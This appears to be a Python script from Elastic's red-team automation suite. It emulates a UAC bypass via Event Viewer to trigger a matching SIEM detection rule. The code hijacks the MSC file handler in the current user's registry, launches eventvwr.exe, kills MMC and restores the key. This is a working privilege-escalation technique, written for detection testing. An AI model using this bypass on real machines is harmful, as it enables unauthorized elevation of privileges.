# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Bypass UAC via Event Viewer
# RTA: uac_eventviewer.py
# ATT&CK: T1088
# Description: Modifies the Registry value to change the handler for MSC files, bypassing UAC.

import sys
import time

from . import _common, RuleMetadata, register_code_rta, OSType


@register_code_rta(
    id="1185afa2-49aa-4cca-8702-228d238c0bd5",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[RuleMetadata(id="31b4c719-f2b4-41f6-a9bd-fce93c2eaf62", name="Bypass UAC via Event Viewer")],
    techniques=["T1548"],
)


# Default machine value:
# HKLM\Software\Classes\MSCFile\shell\open\command\(Default)
# %SystemRoot%\system32\mmc.exe "%1" %*


def main(target_file=_common.get_path("bin", "myapp.exe")):
    winreg = _common.get_winreg()
    _common.log("Bypass UAC with %s" % target_file)

    _common.log("Writing registry key")
    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
    winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)

    _common.log("Running event viewer")
    _common.execute(["c:\\windows\\system32\\eventvwr.exe"])

    time.sleep(3)
    _common.log("Killing MMC", log_type="!")
    _common.execute(["taskkill", "/f", "/im", "mmc.exe"])

    _common.log("Restoring registry key", log_type="-")
    winreg.DeleteValue(hkey, "")
    winreg.DeleteKey(hkey, "")
    winreg.CloseKey(hkey)
